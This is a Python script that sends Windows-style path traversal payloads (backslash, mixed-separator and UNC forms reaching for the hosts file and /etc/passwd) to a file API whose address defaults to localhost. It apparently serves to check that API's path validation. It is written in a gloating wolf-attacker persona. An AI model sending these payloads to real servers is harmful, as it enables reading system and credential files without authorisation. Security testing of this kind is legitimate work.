"""
🐺 WINDOWS PATH TRAVERSAL BYPASS EXPLOIT

*snarls with predatory glee* Your path validation only checks Unix separators!
Windows path separators will bypass your filters!

*bares fangs with savage satisfaction* This exploit demonstrates Windows-specific
path traversal bypass techniques.
"""

import requests
from typing import List, Dict
from dataclasses import dataclass
from rich.console import Console

console = Console()

@dataclass
class WindowsPayload:
    """Windows path traversal payload"""
    name: str
    payload: str
    technique: str
    description: str

class WindowsPathTraversalExploit:
    """
    *circles with menacing intent* Exploits Windows path traversal vulnerabilities
    """
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def run_exploit(self) -> List[Dict]:
        """
        *snarls with predatory glee* Execute Windows path traversal attacks
        """
        console.print("[bold red]🐺 WINDOWS PATH TRAVERSAL EXPLOIT[/bold red]")
        
        payloads = self._generate_windows_payloads()
        results = []
        
        for payload in payloads:
            result = self._test_payload(payload)
            results.append(result)
        
        return results
    
    def _generate_windows_payloads(self) -> List[WindowsPayload]:
        """Generate Windows-specific traversal payloads"""
        return [
            WindowsPayload(
                name="Windows Backslash",
                payload="..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                technique="Windows Backslash",
                description="Windows-style path traversal with backslashes"
            ),
            WindowsPayload(
                name="Mixed Separators",
                payload="..\\../..\\../etc/passwd",
                technique="Mixed Separators",
                description="Mixed Unix/Windows path separators"
            ),
            WindowsPayload(
                name="Windows UNC",
                payload="\\\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                technique="Windows UNC",
                description="Windows UNC path traversal"
            )
        ]
    
    def _test_payload(self, payload: WindowsPayload) -> Dict:
        """Test a Windows payload"""
        try:
            response = self.session.get(
                f"{self.base_url}/api/files/{payload.payload}",
                timeout=5
            )
            
            return {
                'payload': payload,
                'success': response.status_code == 200,
                'response_code': response.status_code,
                'description': f"{payload.description} - {'SUCCESS' if response.status_code == 200 else 'BLOCKED'}"
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'success': False,
                'response_code': 0,
                'description': f"{payload.description} - ERROR: {str(e)}"
            }
